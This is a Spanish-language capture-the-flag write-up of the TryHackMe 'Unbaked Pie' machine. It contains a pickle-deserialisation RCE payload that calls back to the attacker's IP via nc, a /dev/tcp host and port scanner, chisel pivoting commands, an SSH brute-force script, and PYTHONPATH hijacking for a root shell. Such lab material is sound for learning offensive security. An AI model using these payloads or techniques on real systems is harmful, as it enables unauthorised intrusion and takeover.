---
title: "Unbaked Pie - Try Hack Me"
layout: single
excerpt:
show_date: true
classes: wide
header:
  teaser: "https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/THM/UbaketPie/data/pie.png?raw=true"
  teaser_home_page: true
  icon: "https://github.com/Wiinsad/Wiinsad.github.io/blob/master/assets/images/icons/TryHackMe.png?raw=true"
categories:
  - Writeup
  - TryHackMe
tags:
  - Pivoting
  - Python
  - Pickle
  - RCE (Remote Code Execution)
  - Path Hijacking
  - BruteForce
  - Linux
---

<p align="center">
<img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/THM/UbaketPie/data/UnbacketPie.png?raw=true">
</p>

La máquina **Unbaked Pie** es una máquina virtual vulnerable de la plataforma **Try Hack Me** con un nivel de dificultad **Medium**  desarrollada por **ch4rm & H0j3n** y publicada **6 de octubre de 2020s** con un sistema operativo **Linux**.

# Port Scan

  Para empezar, hice un escaneo con la herramienta **Nmap** para encontrar los puertos abiertos disponibles en la máquina con **[Ip:10.10.189.24]** utilizando los parámetros:

  - **-p-:**    Escaneo a toda la gama de puertos (65536).
  - **-Pn:**    Evita hacer ping a las maquinas a escanear.
  - **--min-rate:** Envió de paquetes no mas lentos que el numero especificando.
  - **-sS:**    Lanza un sondeo de tipo SYN sigiloso
  - **--open:** Muestra sólo los puertos con un estatus abierto.
  - **-oG:**    Guarda la el output en formato Grepeable.

  <p align="center">
  <img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/THM/UbaketPie/scan/scanPort.png?raw=true">
  </p>


  Una vez que hicimos el escaneo de puertos con la herramienta **ExtractPort**, vemos que los puertos que destacaron en este caso fueron **5003**:  

  <p align="center">
  <img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/THM/UbaketPie/scan/Ports.png?raw=true">
  </p>


  Una vez identificados los puertos abiertos, realizaremos un escaneo de versiones y servicios de estos puertos con la herramienta nmap configurando los siguientes parámetros:

  - **-sC:** Script de enumeración básica de sondeo en puertos y servicios alojados.
  - **-sV:** Detección de versiones en servicios alojados en puertos.
  - **-p :** Puertos a inspeccionar.
  - **-oN:** Formatos de Nmap en los que se guardará el archivo.

  <p align="center">
  <img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/THM/UbaketPie/scan/PortsServ.png?raw=true">
  </p>

  Realmente de este escaneo no logramos sacar mucha información así que como veo que en el resultado se alcanza a ver que tiene etiquetas en **html** entro via web a la ip para ver si tiene alguna servicio http montado.

  <p align="center">
  <img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/THM/UbaketPie/scan/web.png?raw=true">
  </p>

  Efectivamente tiene un servicio **http**, la herramienta de wappalyzer no muestra mucha información acerca de la web por eso intuyo que es un servicio web simple sin gestores de contenido.


# Lateral Movement

  Investigando en la pagina vemos que podemos generar un error si entramos directamente a la url **"http://[IP]:5003/search"**

  <p align="center">
  <img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/THM/UbaketPie/scan/error.png?raw=true">
  </p>

  Entre toda la información se alcanza a ver que unas **cookies** se serializan con **pickle** en **base64**, la cookie es **search_cookie**.

  <p align="center">
  <img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/THM/UbaketPie/scan/cookie.png?raw=true">
  </p>

  Buscando como aprovecharnos sobre esto encontré el siguiente **[articulo](https://davidhamann.de/2020/04/05/exploiting-python-pickle/)** que habla como usar python para serializar la data con pickle y enviarla mediante curl la data que serializamos.

  El codigo que podemos usar es el siguiente:

  ```python
  #!/usr/bin/python

  import cPickle
  import sys
  import base64

  DEFAULT_COMMAND = "whoami | nc [Your IP] [PORT]"
  COMMAND = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_COMMAND

  class PickleRce(object):
      def __reduce__(self):
          import os
          return (os.system,(COMMAND,))

  print base64.b64encode(cPickle.dumps(PickleRce()))
  ```

  Este código ya es suficiente para poder conseguir un **RCE** en la maquina victima, esto se haría usando curl para enviar una petición Get con la cookie serializada y seria de la siguiente forma.

  ```bash
curl -X GET "http://[Ip Machine]:5003/search" -H 'Cookie: search_cookie="[Data Serializada]"'
  ```

  <p align="center">
  <img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/THM/UbaketPie/intrusion/pickle.png?raw=true">
  </p>

  Ya sabiendo que podemos ejecutar comando nos entablamos una shell a nuestro equipo.

  <p align="center">
  <img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/THM/UbaketPie/intrusion/shell.png?raw=true">
  </p>

  Enumerando el sistema podemos ver que estamos en un contenedor el cual tiene la ip **[172.17.0.2]** y también se puede ver que el **bash_history** no fue borrado y podemos ver los comando que se ejecutaron en la maquina, en lo que se ve es que existe un segmento de red el cual tiene la ip **[172.17.0.1]** y tiene al parecer el puerto 22 abierto para comprobar esto me cree un script en **bash** para encontrar diferentes host y sus puertos abiertos.

  <p align="center">
  <img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/THM/UbaketPie/intrusion/ssh.png?raw=true">
  </p>

  ```bash
#!/bin/bash

for i in $(seq 1 254); do
        timeout 1 bash -c "ping -c 1 172.17.0.$i"  &> /dev/null && echo "[!] HOST 172.17.0.$i" &
        for port in $(seq 1 65535);do
                timeout 1 bash -c "echo '' > /dev/tcp/172.17.0.$i/$port" 2>/dev/null && echo $'\t' " [+] Port $port - OPEN" &
        done; wait
done; wait
  ```
  <p align="center">
  <img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/THM/UbaketPie/intrusion/script.png?raw=true">
  </p>

  Como vemos efectivamente tiene el puerto **22** abierto la otra maquina que está en el otro segmento de red así que lo que haremos sera un **pivoting** para saltar a la otra maquina para eso usaremos la herramienta **[chisel](https://github.com/jpillora/chisel)** para hacer un **Port Forwarding**.

  Para esto tienes que compilar el binario de **chisel** puede ser con la primer opción que es una compilación normal ó la segunda que es para reducir su peso sin afectar su funcionamiento:

  - go build .

    ó
  - go build -ldflags "-s  -w" .
  - upx burte chisel

  La forma en que yo me compartí el binario a la maquina victima fue mediante el uso de un simple server con **python** usando el comando:
  ```bash
  python3 -m http.simple 80
  ```
  Y desde la maquina victima usando **wget** aprovechando que en el **bash_history** se ve que esta disponibles en la maquina.
  El uso de chisel es simple, en nuestra maquina de atacante tenemos que ejecutarlo de la siguiente forma:
  ```bash
  ./chisel server --reverse -p 9090
  ```
  Esto es así ya que estamos indicando que queremos montar un server con la propia herramienta de chisel y el parámetro **- -reverse** es para permitir a los clientes especificar un port Forwarding inverso remoto además de las remotas normales y el **-p** sirve para indicar en que puerto local nuestro queremos hacer la tunelización.

  Ahora ya que especificamos esto en nuestra maquina vamos a la maquina victima e ingresamos los siguientes parámetros:

  ```bash
  ./chisel client [Your IP]]:9090 R:22:172.17.0.1:22
  ```
  Aquí estamos especificando que queremos que el chisel actué como cliente a nuestro equipo y por el puerto que configuramos previamente ***(puede ser cualquier puerto escogí esté por que me gusto)*** y con el parámetros **R:** indicamos que sea un remote port Forwarding por el puerto 22 de la maquina victima que es **172.17.0.1** a mi puerto 22.

  Si te preguntas porque no lo hacemos desde nuestra maquina pues es así por que desde nuestra maquina de atacante no tenemos acceso a ese segmento de red pero la maquina que ya comprometimos si lo tiene y lo pudimos verificar a la hora de hacer el host y port discovery con el script en bash que simplemente eran una peticiones **icmp**.

  Ahora ya que hicimos el **port Forwarding** con **chisel** lo podemos verificar con ```lsof -i:22``` y vemos que chisel esta ocupando el puerto **22** de nuestra maquina.

  <p align="center">
  <img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/THM/UbaketPie/intrusion/portf.png?raw=true">
  </p>

  Como vimos que en **bash_history** estaba entrado por **ssh** con el usuario **ramsey** nosotros también entraremos con ese usuario pero como no conocemos la contraseña haré un pequeño script en python para hacer fuerza bruta a el servicio **ssh**.

  ```python
#!/usr/bin/python3

from pexpect import pxssh
from pwn import *
import signal
import sys

def def_handler(sig, frame):
    print "\n[!] Exit..."
    sys.exit(1)

#CTRL C
signal.signal(signal.SIGINT, def_handler)


def conectar(User,Pass):
	try:
	        conectar=pxssh.pxssh()
	        conectar.login(host,User,Pass)
	        print "User and Password Correct"
	        print "[*]User: {}".format(User) + "[*]Password: {}".format(Pass)
	        print "***ACCESS PERMITTED***"

	        return True

	except:
	        return False



if __name__ == '__main__':

    host=raw_input("HOST: ")
    User=raw_input("Ingresa el user: ")

    passw=open('rockyou.txt', 'r')
    Pass=passw.read().split("\n")

    p1 = log.progress("Fuerza Bruta ssh")
    p1.status("Iniciando Fuerza bruta...")
    time.sleep(3)

    i = 0
    while not conectar(User,Pass[i]):
    	p1.status("Probando password %s" % Pass[i].strip('\n'))
        i += 1

  ```
  <p align="center">
  <img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/THM/UbaketPie/intrusion/script2.png?raw=true">
  </p>

# Privilege escalation

  Ya que tenemos las credenciales del usuario **ramsey** entramos por ssh y empezamos a enumerar el sistema, vemos que a nivel de sudo puede ejecutar **"/home/ramsey/vuln.py"** sin proporcionar contraseña como el usuario **oliver**.

  <p align="center">
  <img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/THM/UbaketPie/intrusion/sudo.png?raw=true">
  </p>

  Ya que el archivo .py esta en nuestro directorio nosotros podemos eliminar este archivo aunque no seamos el propietario, haciendo esto podemos crear otro archivo con el mismo nombre y el siguiente contenido:

  ```python
import os

  os.system("/bin/bash")
  ```
  <p align="center">
  <img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/THM/UbaketPie/intrusion/oshell.png?raw=true">
  </p>

  Ahora como el usuario **oliver** viendo los permisos que tiene como a nivel de sudo, se puede ver que es posible ejecutar como el usuario **root** el archivo **/opt/dockerScript.py**

  <p align="center">
  <img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/THM/UbaketPie/intrusion/sudo2.png?raw=true">
  </p>

  El archivo **dockerScript.py** importa la librería **docker** una forma de poder escalar privilegios aquí es haciendo un **path hijacking**, python por defecto busca los archivos importados primero en el directorio actual y luego los que están especificados en el **path** para ver esto podemos usar la siguiente sentencia en python.

  ```python
  python -c 'import sys; print sys.path'
  ```
  <p align="center">
  <img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/THM/UbaketPie/intrusion/path.png?raw=true">
  </p>

  Las comillas simples **' '** en el **path** indican que python primero busca en la ruta actual y si no encuentra el recuso buscá en los siguientes directorios que tiene definido, si lo encuentra en la ruta actual se queda con ese archivo sin importar que en los siguientes haya otro, su orden de prioridad es de izquierda a derecha.

  Sabiendo esto nos podemos ir a la ruta **/tmp** y crear nuestro archivo con código malicioso para poder escalar privilegios. El contenido del archivo seria exentamente el mismo que el pasado ya que lo que hacemos es importar una bash como el usuario que está ejecutando el archivo python que en este caso con el permiso sudo es **root**.

  ```python
import os

  os.system("/bin/bash")
  ```

  Ya que tenemos el archivo creardo ejecutamos la siguiente sentencia de codigo:

  ```bash
  sudo -u root PYTHONPATH=/tmp /usr/bin/python /opt/dockerScript.py
  ```

  - **-u** es para especificar el usuario a usar ***(En este caso root)***.
  - **PYTHONPATH** Este parámetro es para especificar por que ruta debe buscar prioritariamente.

  <p align="center">
  <img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/THM/UbaketPie/intrusion/rshell.png?raw=true">
  </p>


  Como vemos al ejecutar esa sentencia de comandos nos otorgan la shell como **root** y así pudiendo visualizar la flag de root y finalizar la maquina.
